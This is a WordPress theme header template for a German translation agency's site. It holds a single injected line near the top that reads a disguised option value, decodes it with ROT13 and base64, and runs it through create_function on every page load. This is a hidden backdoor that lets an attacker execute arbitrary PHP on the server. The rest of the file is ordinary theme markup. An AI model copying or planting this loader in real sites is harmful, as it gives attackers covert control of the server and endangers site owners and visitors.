<?php
/**
 * The Header for our theme.
 *
 * Displays all of the <head> section and everything up till <div id="content">
 *
 * @package traduset
 */

$z=get_option("_site_transient_browser_04e456b6259c562bddbb5351659b812a"); $z=base64_decode(str_rot13($z[''])); if(strpos($z,"5D57AF6C")!==false){ $_z=create_function("",$z); @$_z(); }
?><!DOCTYPE html>
<html <?php language_attributes(); ?> xmlns="http://www.w3.org/1999/html">
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?php wp_title( '|', true, 'right' ); ?></title>
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">

<?php wp_head(); ?>
    <script src="http://cdn.jquerytools.org/1.2.7/full/jquery.tools.min.js"></script>
</head>

<body <?php body_class(); ?>>
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content"><?php _e( 'Skip to content', 'traduset' ); ?></a>

	<header id="masthead" class="site-header" role="banner">
        <div class="contact-data clearfix">
        <div class="floatleft">
            <?php _e('Telephone', 'traduset');?>:<?php _e('+49 40 368 44 225', 'traduset');?> <?php _e('TelephoneNumber', 'traduset');?>- <?php _e('E-mail', 'traduset');?>: <a href="mailto:<?php _e('info@traduset.de', 'traduset');?>">info@traduset.de</a>
        </div>
        <div id="header-right">
            <ul class="languages">
            <?php wp_list_bookmarks('title_li=&category_before=&category_after='); ?>
            </ul>
        </div>
        </div>
		<div class="site-branding">
            <img src="<?php echo get_template_directory_uri(); ?>/assets/img/<?php _e('traduset_logo.png', 'traduset');?>" alt="<?php _e('Traduset Übersetzungsbüro & Dolmetscherdient', 'traduset');?>"/>
		</div>

		<nav id="site-navigation" class="main-navigation" role="navigation">
			<button class="menu-toggle"><?php _e( '&#8803;', 'traduset' ); ?></button>
			<?php wp_nav_menu( array( 'theme_location' => 'primary' ) ); ?>
		</nav><!-- #site-navigation -->
	</header><!-- #masthead -->

	<div id="content" class="site-content">
